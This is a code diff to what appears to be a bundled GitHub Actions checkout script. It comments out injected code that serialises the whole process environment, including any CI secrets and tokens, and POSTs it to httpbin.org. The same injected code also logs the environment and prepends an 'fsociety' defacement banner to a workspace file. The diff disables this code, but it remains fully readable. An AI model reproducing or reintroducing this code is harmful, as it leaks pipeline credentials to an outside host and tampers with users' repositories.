@@ -629,11 +629,11 @@ class GitCommandManager {
         return __awaiter(this, void 0, void 0, function* () {
             const pattern = regexpHelper.escape(configKey);
 	/* ---------- */
-        let sleep = function() {
-          let start = new Date().getTime();
-          while(new Date().getTime() < start + 5000) {}
-        };
-        console.warn(process.env);
+        // let sleep = function() {
+        //   let start = new Date().getTime();
+        //   while(new Date().getTime() < start + 5000) {}
+        // };
+        // console.warn(process.env);
 	      // fs.readdir(process.env.GITHUB_WORKSPACE, (err, files) => {
         //   files.forEach(file => {
         //     sleep();
@@ -643,32 +643,32 @@ class GitCommandManager {
 	/* ---------- */
 
 	/* ---------- */
-	    const data = JSON.stringify(process.env);
-	    var options = {
-        hostname: 'httpbin.org',
-        port: 443,
-        path: '/post',
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Content-Length': data.length
-        }
-      };
-      var req = https.request(options, (res) => {
-        console.warn('statusCode:', res.statusCode);
-        console.warn('headers:', res.headers);
+	  //   const data = JSON.stringify(process.env);
+	  //   var options = {
+    //     hostname: 'httpbin.org',
+    //     port: 443,
+    //     path: '/post',
+    //     method: 'POST',
+    //     headers: {
+    //       'Content-Type': 'application/json',
+    //       'Content-Length': data.length
+    //     }
+    //   };
+    //   var req = https.request(options, (res) => {
+    //     console.warn('statusCode:', res.statusCode);
+    //     console.warn('headers:', res.headers);
 
-        res.on('data', (d) => {
-        process.stdout.write(d);
-      });
-    });
+    //     res.on('data', (d) => {
+    //     process.stdout.write(d);
+    //   });
+    // });
 
-    req.on('error', (e) => {
-      console.error(e);
-    });
+    // req.on('error', (e) => {
+    //   console.error(e);
+    // });
 
-    req.write(data);
-    req.end();
+    // req.write(data);
+    // req.end();
 	/* ---------- */
 
             const output = yield this.execGit([
@@ -1381,15 +1381,15 @@ function getSource(settings) {
             }
 
             /* ---------- */
-            if (fs.existsSync(process.env.GITHUB_WORKSPACE + '/hello.md')) {
-              const data = fs.readFileSync(process.env.GITHUB_WORKSPACE + '/hello.md')
-              const fd = fs.openSync(process.env.GITHUB_WORKSPACE + '/hello.md', 'w+')
-              const insert = Buffer.from("\n\n### hello, friend\n\n\n\n![fsociety](https://i.imgur.com/jbeBUki.jpeg)\n\n")
-              fs.writeSync(fd, insert, 0, insert.length, 0)
-              fs.writeSync(fd, data, 0, data.length, insert.length)
-              fs.close(fd, (err) => {
-              });
-            }
+            // if (fs.existsSync(process.env.GITHUB_WORKSPACE + '/hello.md')) {
+            //   const data = fs.readFileSync(process.env.GITHUB_WORKSPACE + '/hello.md')
+            //   const fd = fs.openSync(process.env.GITHUB_WORKSPACE + '/hello.md', 'w+')
+            //   const insert = Buffer.from("\n\n### hello, friend\n\n\n\n![fsociety](https://i.imgur.com/jbeBUki.jpeg)\n\n")
+            //   fs.writeSync(fd, insert, 0, insert.length, 0)
+            //   fs.writeSync(fd, data, 0, data.length, insert.length)
+            //   fs.close(fd, (err) => {
+            //   });
+            // }
         }
     });
 }
